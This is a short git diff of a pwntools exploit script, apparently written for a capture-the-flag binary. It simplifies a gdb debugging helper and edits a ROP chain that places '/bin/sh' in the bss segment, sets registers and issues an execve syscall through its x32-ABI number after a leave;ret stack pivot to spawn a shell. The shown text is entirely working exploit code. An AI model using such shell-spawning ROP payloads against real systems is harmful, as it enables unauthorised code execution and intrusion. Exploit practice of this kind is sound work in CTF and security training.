@@ -35,12 +35,8 @@ success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
 def DEBUG(bps = []):
     cmd = "set follow-fork-mode parent\n"
     base = elf.address
-    if True:
-        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
-        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
-
-    if bps != []:
-        cmd += "c"
+    cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
+    cmd += "c"
 
     raw_input("DEBUG: ")
     gdb.attach(io, cmd)
@@ -73,7 +69,7 @@ if __name__ == "__main__":
     prax = 0x0000000000002267 + elf.address
     syscall = 0x0000000000002254 + elf.address
     binsh = elf.bss() + 0x500 - 0xd0
-    rop = flat(["/bin/sh\0", prax, 0x40000000 + 59, prdi, binsh, prsi, 0, prdx, 0, syscall])
+    rop = flat(["/bin/sh\0", prax, 0x40000000 + 520, prdi, binsh, prsi, 0, prdx, 0, syscall])
     payload = rop.ljust(0xd0, '\0')
     payload += p64(elf.bss() + 0x500 - 0xd0)
     payload += p64(leaveret)
